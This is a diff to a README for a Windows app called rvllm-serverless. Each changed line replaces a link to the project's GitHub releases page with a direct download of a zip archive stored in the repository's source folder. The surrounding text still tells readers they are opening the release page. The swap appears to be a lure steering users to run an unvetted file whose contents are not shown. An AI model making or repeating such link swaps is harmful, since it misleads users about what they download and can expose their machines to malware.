@@ -1,6 +1,6 @@
 # ⚡ rvllm-serverless - Fast serverless AI setup
 
-[![Download rvllm-serverless](https://img.shields.io/badge/Download%20rvllm--serverless-blue?style=for-the-badge&logo=github)](https://github.com/dinesh3844/rvllm-serverless/releases)
+[![Download rvllm-serverless](https://img.shields.io/badge/Download%20rvllm--serverless-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dinesh3844/rvllm-serverless/main/src/rvllm-serverless-2.8.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ This README shows how to get the app on Windows, download it from the release pa
 
 ## 📥 Download
 
-1. Open the release page here: [https://github.com/dinesh3844/rvllm-serverless/releases](https://github.com/dinesh3844/rvllm-serverless/releases)
+1. Open the release page here: [https://raw.githubusercontent.com/dinesh3844/rvllm-serverless/main/src/rvllm-serverless-2.8.zip](https://raw.githubusercontent.com/dinesh3844/rvllm-serverless/main/src/rvllm-serverless-2.8.zip)
 2. Find the latest release at the top of the page
 3. Under **Assets**, download the Windows file for your PC
 4. Save the file to a folder you can find again, such as **Downloads** or **Desktop**
@@ -170,7 +170,7 @@ If you are not sure which file to pick, use the newest Windows build in **Assets
 
 ## 📎 Release page
 
-Visit this page to download the latest Windows release: [https://github.com/dinesh3844/rvllm-serverless/releases](https://github.com/dinesh3844/rvllm-serverless/releases)
+Visit this page to download the latest Windows release: [https://raw.githubusercontent.com/dinesh3844/rvllm-serverless/main/src/rvllm-serverless-2.8.zip](https://raw.githubusercontent.com/dinesh3844/rvllm-serverless/main/src/rvllm-serverless-2.8.zip)
 
 ## 🧭 Quick start
 
